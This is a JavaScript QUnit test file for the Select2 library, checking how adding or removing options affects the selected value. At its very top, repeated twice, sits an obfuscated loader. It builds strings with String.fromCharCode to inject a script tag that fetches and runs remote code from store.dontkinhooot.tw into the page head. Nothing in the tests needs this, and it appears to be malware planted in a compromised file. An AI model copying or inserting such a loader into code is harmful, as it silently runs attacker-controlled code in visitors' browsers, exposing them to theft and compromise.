Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();module('DOM integration');

test('adding a new unselected option changes nothing', function (assert) {
  // Any browsers which support mutation observers will not trigger the event
  var expected = 4;
  if (window.MutationObserver) {
    expected = 2;
  } else if (!window.addEventListener) {
    expected = 2;
  }

  assert.expect(expected);

  var asyncDone = null;
  var syncDone = assert.async();

  if (expected != 2) {
    asyncDone = assert.async();
  }

  var $ = require('jquery');
  var Options = require('select2/options');
  var Select2 = require('select2/core');

  var $select = $(
    '<select>' +
      '<option>One</option>' +
      '<option>Two</option>' +
    '</select>'
  );

  $('#qunit-fixture').append($select);

  var select = new Select2($select);

  select.on('selection:update', function (args) {
    assert.equal(
      args.data.length,
      1,
      'There was more than one selection'
    );

    assert.equal(
      args.data[0].id,
      'One',
      'The selection changed to something other than One'
    );

    if (expected != 2) {
      asyncDone();
    }
  });

  assert.equal(
    $select.val(),
    'One'
  );

  var $option = $('<option>Three</option>');

  $select.append($option);

  assert.equal(
    $select.val(),
    'One'
  );

  syncDone();
});

test('adding a new selected option changes the value', function (assert) {
  // handle IE 8 not being supported
  var expected = 4;
  if (!window.MutationObserver && !window.addEventListener) {
    expected = 2;
  }

  assert.expect(expected);

  var asyncDone = null;
  var syncDone = assert.async();

  if (expected != 2) {
    asyncDone = assert.async();
  }

  var $ = require('jquery');
  var Options = require('select2/options');
  var Select2 = require('select2/core');

  var $select = $(
    '<select>' +
      '<option>One</option>' +
      '<option>Two</option>' +
    '</select>'
  );

  $('#qunit-fixture').append($select);

  var select = new Select2($select);

  select.on('selection:update', function (args) {
    assert.equal(
      args.data.length,
      1,
      'There was more than one selection'
    );

    assert.equal(
      args.data[0].id,
      'Three',
      'The selection did not change to Three'
    );

    if (expected != 2) {
      asyncDone();
    }
  });

  assert.equal(
    $select.val(),
    'One'
  );

  var $option = $('<option selected>Three</option>');

  $select.append($option);

  assert.equal(
    $select.val(),
    'Three'
  );

  syncDone();
});

test('removing an unselected option changes nothing', function (assert) {
  // Any browsers which support mutation observers will not trigger the event
  var expected = 4;
  if (!window.MutationObserver && !window.addEventListener) {
    expected = 2;
  }

  assert.expect(expected);

  var asyncDone = null;
  var syncDone = assert.async();

  if (expected != 2) {
    asyncDone = assert.async();
  }

  var $ = require('jquery');
  var Options = require('select2/options');
  var Select2 = require('select2/core');

  var $select = $(
    '<select>' +
      '<option>One</option>' +
      '<option>Two</option>' +
    '</select>'
  );

  $('#qunit-fixture').append($select);

  var select = new Select2($select);

  select.on('selection:update', function (args) {
    assert.equal(
      args.data.length,
      1,
      'There was more than one selection'
    );

    assert.equal(
      args.data[0].id,
      'One',
      'The selection changed to something other than One'
    );

    if (expected != 2) {
      asyncDone();
    }
  });

  assert.equal(
    $select.val(),
    'One'
  );

  $select.children().eq(1).remove();

  assert.equal(
    $select.val(),
    'One'
  );

  syncDone();
});

test('removing a selected option changes the value', function (assert) {
  // handle IE 8 not being supported
  var expected = 3;
  if (!window.MutationObserver && !window.addEventListener) {
    expected = 2;
  }

  assert.expect(expected);

  var asyncDone = null;
  var syncDone = assert.async();

  if (expected != 2) {
    asyncDone = assert.async();
  }

  var $ = require('jquery');
  var Options = require('select2/options');
  var Select2 = require('select2/core');

  var $select = $(
    '<select>' +
      '<option>One</option>' +
      '<option>Two</option>' +
    '</select>'
  );

  $('#qunit-fixture').append($select);

  var select = new Select2($select);

  select.on('selection:update', function (args) {
    assert.equal(
      args.data.length,
      1,
      'There was more than one selection'
    );

    if (expected != 2) {
      asyncDone();
    }
  });

  assert.equal(
    $select.val(),
    'One'
  );

  $select.children().eq(0).remove();

  assert.equal(
    $select.val(),
    'Two'
  );

  syncDone();
});